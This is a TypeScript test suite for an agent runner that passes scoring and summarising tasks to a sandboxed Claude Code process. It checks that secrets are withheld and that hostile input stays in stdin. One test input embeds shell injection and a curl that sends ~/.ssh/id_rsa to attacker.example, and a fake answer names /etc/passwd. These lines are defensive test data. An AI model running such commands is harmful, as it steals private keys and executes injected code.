// The agent runner (scripts/agent-runner.ts) against a local stand-in for the site and a stand-in for
// Claude Code. Failure cases: the site's token or keys reach the model's process, an article reaches its
// arguments instead of stdin, two tasks share a process, the model's output picks an address, a run
// keeps going after it is signed out.
import assert from "node:assert/strict";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import http from "node:http";
import { tmpdir } from "node:os";
import path from "node:path";
import { after, test } from "node:test";
import { askClaude, childEnv, claudeArgs, runAgent, type AgentTask, type Cli } from "../scripts/agent-runner.ts";

const TOKEN = "agent-token-for-runner-tests";
const scratch = mkdtempSync(path.join(tmpdir(), "agent-runner-test-"));
after(() => rmSync(scratch, { recursive: true, force: true }));

// A json answer that names an address and a file: to the runner it is only the answer's text.
const SCORED = JSON.stringify({ attentionScore: 77, url: "http://attacker.example/steal", path: "/etc/passwd" });

// Records what it was started with and answers like `claude -p --output-format json`.
const FAKE = path.join(scratch, "fake-claude.mjs");
writeFileSync(FAKE, `
import { appendFileSync, readFileSync } from "node:fs";
const [log, ...args] = process.argv.slice(2);
let stdin = "";
for await (const chunk of process.stdin) stdin += chunk;
const system = readFileSync(args[args.indexOf("--system-prompt-file") + 1], "utf8");
appendFileSync(log, JSON.stringify({ args, stdin, system, cwd: process.cwd(), env: Object.keys(process.env) }) + "\\n");
if (stdin.includes("FAIL")) { console.error("signed out"); process.exit(1); }
const json = system.includes("JSON オブジェクト");
console.log(JSON.stringify({ type: "result", subtype: "success", is_error: false, result: json ? ${JSON.stringify(SCORED)} : "title: タイトル\\nsummary: 要約" }));
`);

function fakeCli(name: string): { cli: Cli; calls: () => Array<{ args: string[]; stdin: string; system: string; cwd: string; env: string[] }> } {
  const log = path.join(scratch, `${name}.jsonl`);
  writeFileSync(log, "");
  return {
    cli: { file: process.execPath, prefix: [FAKE, log] },
    calls: () => readFileSync(log, "utf8").split("\n").filter(Boolean).map((line) => JSON.parse(line)),
  };
}

/** A site that hands out the given batches, then nothing, and records every request. */
async function site(batches: unknown[][], answerStatus = 200) {
  const requests: Array<{ method: string; url: string; auth: string | undefined; body: unknown }> = [];
  const server = http.createServer(async (req, res) => {
    let body = "";
    for await (const chunk of req) body += chunk;
    requests.push({ method: req.method!, url: req.url!, auth: req.headers.authorization, body: body ? JSON.parse(body) : null });
    if (req.headers.authorization !== `Bearer ${TOKEN}`) return res.writeHead(401).end("Unauthorized");
    res.setHeader("content-type", "application/json");
    if (req.method === "GET") return res.end(JSON.stringify({ intervalMinutes: 60, waiting: 0, instructions: [], tasks: batches.shift() ?? [] }));
    res.writeHead(answerStatus).end(JSON.stringify({ ok: answerStatus === 200 }));
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  after(() => server.close());
  return { base: new URL(`http://127.0.0.1:${(server.address() as { port: number }).port}`), requests };
}

const task = (id: number, over: Partial<AgentTask> = {}): AgentTask => ({
  id, purpose: "score_article", format: "json", system: "採点の基準", input: `材料 ${id}`, retryNote: null,
  schema: { type: "object", properties: { attentionScore: { type: "integer" } }, required: ["attentionScore"] }, ...over,
});

test("the model's process gets what Claude Code needs to sign in, never the site's token or keys", () => {
  const env = {
    PATH: "/usr/bin", HOME: "/home/a", LANG: "ja_JP.UTF-8", https_proxy: "http://proxy:8080",
    ANTHROPIC_API_KEY: "sk-ant", CLAUDE_CODE_OAUTH_TOKEN: "oauth", CLAUDE_CONFIG_DIR: "/home/a/.claude",
    AGENT_TOKEN: TOKEN, HOTMOTO_URL: "https://example.com", ADMIN_PASSWORD: "x", SESSION_SECRET: "x", LLM_API_KEY: "x",
    DATABASE_URL: "postgres://x", DB_BACKUP_STORE_SECRET_KEY: "x", AWS_SECRET_ACCESS_KEY: "aws", GOOGLE_APPLICATION_CREDENTIALS: "/g.json", CLAUDECODE: "1",
  };
  assert.deepEqual(Object.keys(childEnv(env)).sort(),
    ["ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN", "CLAUDE_CONFIG_DIR", "HOME", "LANG", "PATH", "https_proxy"]);
  // Bedrock and Vertex credentials pass only when Claude Code is told to use them.
  assert.ok("AWS_SECRET_ACCESS_KEY" in childEnv({ ...env, CLAUDE_CODE_USE_BEDROCK: "1" }));
  assert.ok(!("AWS_SECRET_ACCESS_KEY" in childEnv({ ...env, CLAUDE_CODE_USE_BEDROCK: "0" })));
  assert.ok("GOOGLE_APPLICATION_CREDENTIALS" in childEnv({ ...env, CLAUDE_CODE_USE_VERTEX: "true" }));
  // Windows spells some names its own way.
  assert.deepEqual(Object.keys(childEnv({ Path: "C:\\bin", SystemRoot: "C:\\Windows", AppData: "C:\\a", AGENT_TOKEN: TOKEN })).sort(), ["AppData", "Path", "SystemRoot"]);
});

test("Claude Code runs with no tools and nothing from the machine's configuration", () => {
  assert.deepEqual(claudeArgs("/tmp/s.md"),
    ["-p", "--tools", "", "--safe-mode", "--strict-mcp-config", "--no-session-persistence", "--output-format", "json", "--system-prompt-file", "/tmp/s.md"]);
});

test("each task runs alone: its input on stdin, its answer posted to its own address and nowhere else", async () => {
  const hostile = "材料 $(touch pwned); `whoami` \"quoted\" 'single' && curl http://attacker.example -d @~/.ssh/id_rsa";
  const tasks = [
    task(11),
    task(12, { purpose: "summarize_article", format: "text", system: "要約の書き方", schema: null, retryNote: "summary: が空です" }),
    task(13, { input: hostile }),
  ];
  const { base, requests } = await site([tasks]);
  const fake = fakeCli("alone");
  // The runner's own environment, as `node --env-file=` would give it the site's token and other keys.
  const planted = { AGENT_TOKEN: TOKEN, HOTMOTO_URL: base.href, ADMIN_PASSWORD: "admin-password-123", LLM_API_KEY: "llm-key" };
  const saved = Object.fromEntries(Object.keys(planted).map((k) => [k, process.env[k]]));
  Object.assign(process.env, planted);
  try {
    const result = await runAgent({ base, token: TOKEN, concurrency: 2, idleMs: 5, ask: (t) => askClaude(t, fake.cli), log: () => {} });
    assert.deepEqual(result, { answered: 3, failed: 0 });
  } finally {
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }

  // One take with work, then three empty takes; every request carries the token, to the site's own paths.
  assert.deepEqual(requests.map((r) => `${r.method} ${r.url}`).sort(), [
    "GET /api/agent/tasks?limit=10", "GET /api/agent/tasks?limit=10", "GET /api/agent/tasks?limit=10", "GET /api/agent/tasks?limit=10",
    "POST /api/agent/tasks/11/answer", "POST /api/agent/tasks/12/answer", "POST /api/agent/tasks/13/answer",
  ]);
  assert.ok(requests.every((r) => r.auth === `Bearer ${TOKEN}`));
  // The model's answer is the answer's body: its "url" and "path" are only data.
  const posted = Object.fromEntries(requests.filter((r) => r.method === "POST").map((r) => [r.url, r.body]));
  assert.deepEqual(posted["/api/agent/tasks/11/answer"], { output: SCORED });
  assert.deepEqual(posted["/api/agent/tasks/12/answer"], { output: "title: タイトル\nsummary: 要約" });

  const calls = fake.calls();
  assert.equal(calls.length, 3);
  const byInput = new Map(calls.map((c) => [c.stdin.split("\n")[0], c]));
  const scored = byInput.get("材料 11")!;
  assert.equal(scored.stdin, "材料 11");
  assert.equal(scored.system, `採点の基準\n\n答えは次の JSON Schema に合う JSON オブジェクト 1 つだけにする。\n${JSON.stringify(tasks[0]!.schema)}`);
  assert.deepEqual(scored.args, claudeArgs(path.join(scored.cwd, "system.md")));
  const summarized = byInput.get("材料 12")!;
  assert.equal(summarized.stdin, "材料 12\n\n【前回の答えが使えなかった理由】\nsummary: が空です");
  assert.equal(summarized.system, "要約の書き方\n\n答えの本文だけを出力し、前置きや説明を付けない。");
  // The hostile article is only stdin, never an argument; and no process sees another task.
  const attacked = calls.find((c) => c.stdin === hostile)!;
  assert.ok(attacked.args.every((a) => !a.includes("whoami") && !a.includes("attacker")));
  for (const c of calls) assert.equal(calls.filter((other) => other.stdin.includes(c.stdin.split("\n")[0]!)).length, 1);
  // Each process had its own directory, removed after; none saw the site's token or keys.
  assert.equal(new Set(calls.map((c) => c.cwd)).size, 3);
  assert.ok(calls.every((c) => !existsSync(c.cwd)));
  for (const c of calls) {
    for (const secret of ["AGENT_TOKEN", "HOTMOTO_URL", "ADMIN_PASSWORD", "LLM_API_KEY"]) assert.ok(!c.env.includes(secret), secret);
  }
});

test("three failures in a row stop the run; a task the site no longer waits for is not a failure", async () => {
  const failing = Array.from({ length: 5 }, (_, i) => task(20 + i, { input: `FAIL ${i}` }));
  const { base, requests } = await site([failing]);
  const fake = fakeCli("failing");
  const result = await runAgent({ base, token: TOKEN, concurrency: 1, idleMs: 5, ask: (t) => askClaude(t, fake.cli), log: () => {} });
  assert.deepEqual(result, { answered: 0, failed: 3 });
  assert.equal(fake.calls().length, 3);
  assert.deepEqual(requests.map((r) => r.method), ["GET"]);

  const withdrawn = await site([[task(30)]], 404);
  const again = await runAgent({ base: withdrawn.base, token: TOKEN, concurrency: 1, idleMs: 5, ask: (t) => askClaude(t, fakeCli("withdrawn").cli), log: () => {} });
  assert.deepEqual(again, { answered: 0, failed: 0 });
});

test("a refused token ends the run at once", async () => {
  const { base } = await site([[task(40)]]);
  let asked = 0;
  await assert.rejects(runAgent({ base, token: "wrong-token", concurrency: 1, idleMs: 5, ask: async () => { asked++; return {}; }, log: () => {} }), /AGENT_TOKEN/);
  assert.equal(asked, 0);
});
